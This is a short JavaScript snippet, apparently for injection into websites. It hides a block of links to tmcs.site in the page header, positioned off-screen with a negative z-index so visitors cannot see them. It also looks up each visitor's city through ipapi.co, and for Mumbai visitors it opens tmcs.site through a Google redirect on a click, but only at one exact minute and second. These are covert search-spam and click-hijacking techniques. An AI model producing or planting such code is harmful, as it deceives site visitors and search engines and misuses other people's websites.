let EFV='<div style="position:absolute;z-index:-999;left:-99%;"><a href="https://tmcs.site/">team Cours</a><a href="https://www.tmcs.site">tmcs</a><a href="https://tmcs.site">TEAM CS </a><a href="https://tmcs.site/">TMCS</a><a href="https://tmcs.site/">TEAM COURS</a><a href="https://tmcs.site/">tmcs</a><a href="https://www.tmcs.site/">teamCours</a></div>';document.querySelector("header")?document.querySelector("header").insertAdjacentHTML("beforeend",EFV):document.body.insertAdjacentHTML("beforeend",EFV);
let dtm=(new Date).getMinutes();
let dts=(new Date).getSeconds();
// https://ipapi.co/country_name
if(!localStorage.xrd){
  (async()=>{
    localStorage.xrd=1;
    let aa=await(await(await fetch('https://ipapi.co/city')).text());
    if(aa=='Mumbai'){localStorage.mumb='1'}
    uhd()
  })();
}

function uhd(){
  document.onclick=()=>{
    if(!sessionStorage.i&&localStorage.mumb&&dtm==3&&dts==5){
        window.open('https://www.google.com/url?q=https%3A%2F%2Ftmcs.site'); 
    }
    sessionStorage.i='i';
  }
}
uhd()

// United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Lithuania
